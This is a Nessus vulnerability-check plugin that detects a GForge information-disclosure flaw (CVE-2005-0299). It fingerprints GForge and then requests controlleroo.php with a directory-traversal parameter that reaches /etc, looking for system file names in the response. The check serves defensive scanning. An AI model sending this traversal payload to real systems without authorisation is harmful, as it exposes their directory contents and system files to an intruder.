#
# (C) Tenable Network Security
#

if(description)
{
  script_id(16225);
  script_cve_id("CVE-2005-0299");
  script_bugtraq_id(12318);
  script_version("$Revision: 1.4 $");
  
  script_name(english:"GForge Information Disclosure");

 desc["english"] = "
The remote host is running GForge, a CVS repository browser written
in PHP.

The remote version of this software is vulnerable to an information disclosure
vulnerability.

By supplying a malformed parameter to the scripts 'controller.php' and 'controlleroo.php', 
an attacker may force the remote CGI to disclose the content of arbitrary directories
stored on the remote host.

Solution: Upgrade to GForge 4.0.0 or newer
Risk factor : Medium";

  script_description(english:desc["english"]);
  script_summary(english:"Checks for a flaw in GForge");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencie("http_version.nasl");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

foreach dir ( cgi_dirs() )
{
buf = http_get(item:dir + "/index.php", port:port);
r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
if( r == NULL )exit(0);

 if ( "gforge.org" >< tolower(r) )
 {
  for ( i = 0 ; i < 15 ; i ++ )
	{
		buf = http_get(item:dir + "/scm/controlleroo.php?group_id=" + i + "&dir_name=../../../../../../../../etc", port:port);
		r = http_keepalive_send_recv(port:port, data:buf, bodyonly:1);
		if ( r == NULL ) exit(0);
		if ( "passwd" >< r &&
	             "group"  >< r &&
		     "resolv.conf" >< r &&
		     "hosts" >< r )
			{
			 security_warning(port);
			 exit(0);
			}
	}
    exit(0);
 }
}
